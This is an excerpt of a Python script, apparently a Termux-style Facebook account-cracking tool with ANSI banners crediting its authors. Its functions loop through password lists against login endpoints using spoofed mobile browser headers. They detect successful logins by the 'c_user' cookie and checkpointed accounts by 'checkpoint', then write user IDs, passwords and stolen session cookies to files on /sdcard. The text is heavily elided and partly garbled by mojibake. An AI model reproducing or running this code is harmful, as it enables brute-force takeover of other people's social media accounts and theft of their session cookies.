...
try:
    ...
    exit()
def banner():
    print("[=] ÃƒÂ°Ã…Â¸Ã‹Å“Ã…â€™ Testing New mathod By yousuf")
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r\r {G}[â€¢] Active Apks & Web {G}       ')
    ...
    if len(game)==0:
        ...
        print(f'\r\r [{M}â€¢{P}]{M} Expired Apks & Web {P}')
        for i in range(len(game)):
...
\x1b[38;5;46m===============================================   
 ...
 \033[1;31m[\033[1;32m[S]\033[1;31m]\033[1;32m FACEBOOK  :  ARSHAD AHMED TOPU
 \033[1;31m[\033[1;32m[H]\033[1;31m]\033[1;32m GITHUB    : ARSHAD-404-CYBER
 \033[1;31m[\033[1;32m[A]\033[1;31m]\033[1;32m TOOLS     : RENDOME
 \033[1;31m[\033[1;32m[D]\033[1;31m]\033[1;32m VERSION   : \033[1;31m[V-17]
\x1b[38;5;46m===============================================\033[1;37m\n""")
def Main():
	os.system('clear')
	print(logo)
...
def mathod1():
	...
	print(' [\033[1;32m!\033[1;37m] Ok Ids Save [\033[1;32mÃ¢Å¸Â©\033[1;37m] /sdcard/TRICK A4SHAD Ã¢â‚¬Â¢RANDOMÃ¢â‚¬Â¢OK.txt')
	print(47*'\033[1;31m\033[1;37m')
	exit()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:        	            
            ...
            sys.stdout.write(f'\r [TRICK A4SHAD  M1] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print(f'\r\33[1;92m [TRICK A4SHAD  OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;37m [COOKIES] '+coki)
                open('/sdcard/TRICK A4SHAD  RANDOM OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\33[1;91m[TRICK A4SHAD  CP] {uid} | {ps}")
                open('/sdcard/R TRICK A4SHAD  CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def m2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:        	            
            session = requests.Session()
            sys.stdout.write(f'\r [TRICK A4SHAD  M2] - %s - %s - OK - [\033[1;32m%s\033[1;37m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=D_GFZD-ybgnqHwOC0CpjFNeF; sb=D_GFZL3DXGs0NkGxFI6CTWwA; m_pixel_ratio=2.4000000953674316; wd=450x839; fr=0DvQVjAYiu1RLkmsm..BkhfEP.eW.AAA.0.0.BknXWm.AWVCSzR6jm8',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/TRICK A4SHAD  RANDOM OK M2.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
